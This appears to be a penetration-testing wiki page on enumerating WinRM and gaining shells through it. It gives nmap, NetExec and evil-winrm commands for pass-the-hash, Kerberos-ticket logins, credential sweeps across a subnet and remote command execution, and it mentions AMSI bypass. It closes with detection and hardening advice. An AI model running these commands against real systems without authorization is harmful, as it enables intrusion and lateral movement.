---
title: WinRM enumeration
slug: winrm-enum
---

> **TL;DR:** TCP/5985 (HTTP) and 5986 (HTTPS). Windows Remote Management is SOAP-over-HTTP with Negotiate/Kerberos/CredSSP auth. With local admin or `Remote Management Users` membership it is a clean, fileless interactive shell — evil-winrm or PowerShell remoting.

## What it is
WinRM is Microsoft's WS-Management implementation — XML SOAP over HTTP(S) for remote command execution and PowerShell remoting. It listens on 5985 (HTTP, Negotiate-encrypted by default since Windows 8/2012) and 5986 (HTTPS). Auth schemes include Negotiate (Kerberos → NTLM fallback), Kerberos-only, Basic (over HTTPS only by policy), CredSSP (delegated credentials, double-hop), and certificate. From an attacker view it is the preferred remote-execution method on a target with WinRM enabled: it leaves much smaller forensic footprint than `psexec`-style service install, accepts pass-the-hash with NTLM auth, and pairs naturally with [[password-spraying]] and Kerberos primitives.

## Preconditions / where it applies
- WinRM service running and `WinRM/Listener` configured. Enabled by default on Server 2012+; rare on workstations.
- Caller is a local administrator or a member of `Remote Management Users` (BUILTIN), or has been explicitly granted via the WinRM SDDL.
- Network reachability to 5985/5986. For Kerberos auth, the SPN (`HTTP/host`) must resolve to a reachable KDC.
- Related: [[smb-enum]], [[rdp-enum]], [[kerberos-enum]].

## Technique
Identify listeners and supported auth:

```bash
nmap -p5985,5986 -sV --script=http-title TARGET
nxc winrm TARGET -u '' -p ''           # NetExec WinRM probe
```

Authenticate and pop a shell with evil-winrm — the canonical client. Password, NT hash, or Kerberos ticket all supported:

```bash
evil-winrm -i TARGET -u administrator -p 'Hunter2!'
evil-winrm -i TARGET -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
KRB5CCNAME=alice.ccache evil-winrm -i host.corp.local -u alice -r CORP.LOCAL
```

NetExec sweeps a CIDR — instantly highlights every host where a credential gets remote execution:

```bash
nxc winrm 10.10.0.0/24 -u alice -H ":31d6...089c0" --local-auth
nxc winrm 10.10.0.0/24 -u alice -p 'Spring2026!' -d corp.local
nxc winrm TARGET -u alice -p 'Spring2026!' -x 'whoami /priv'
```

Native PowerShell remoting from a Windows foothold — uses the same protocol, more OPSEC-friendly than dropping evil-winrm:

```powershell
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred -Authentication Kerberos
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; hostname }
```

evil-winrm features worth knowing: `upload`/`download` for file transfer (uses base64-chunked WSMan), `menu` exposes `Invoke-Binary` and `Bypass-4MSI` to run binaries from memory and to attempt AMSI patching, `-s scripts/` auto-loads .ps1 modules, and `-e exes/` enables in-memory exec of unmanaged binaries.

Double-hop limitation: by default a WinRM session cannot delegate creds to a second host (`access denied` accessing UNC paths). Solutions: CredSSP (`Enable-WSManCredSSP`), Kerberos constrained delegation, or resource-based constrained delegation. Each is a separate finding when misconfigured.

## Detection and defence
- 4624/4625 logon events with `LogonType=3` and `LogonProcessName=Kerberos`/`NtLmSsp` plus 4688 process-create for `wsmprovhost.exe` (the WinRM provider host) signal a remote session. Microsoft-Windows-WinRM/Operational logs Channel events 91 (session create) and 161 (auth failure).
- EDR: alert on `wsmprovhost.exe` spawning unusual children (`powershell.exe -enc`, `cmd.exe`, `rundll32`), on AMSI bypass patterns, and on evil-winrm's distinctive base64-chunked upload behaviour.
- Harden: restrict `Remote Management Users` to a small admin group, prefer HTTPS listener (5986) with a real certificate, disable Basic auth (`Set-Item WSMan:\localhost\Service\Auth\Basic $false`), disable CredSSP unless required, and lock the SDDL via `Set-PSSessionConfiguration -Name Microsoft.PowerShell -ShowSecurityDescriptorUI`.
- Network: limit 5985/5986 to a management VLAN; Just Enough Administration (JEA) constrains what a remoted session can run.

## References
- [HackTricks — 5985/5986 WinRM](https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html) — auth modes, evil-winrm recipes, double-hop.
- [evil-winrm GitHub](https://github.com/Hackplayers/evil-winrm) — flag reference and built-in menu commands.
- [Microsoft — WinRM Security](https://learn.microsoft.com/en-us/windows/win32/winrm/authentication-for-remote-connections) — official auth/encryption configuration knobs.
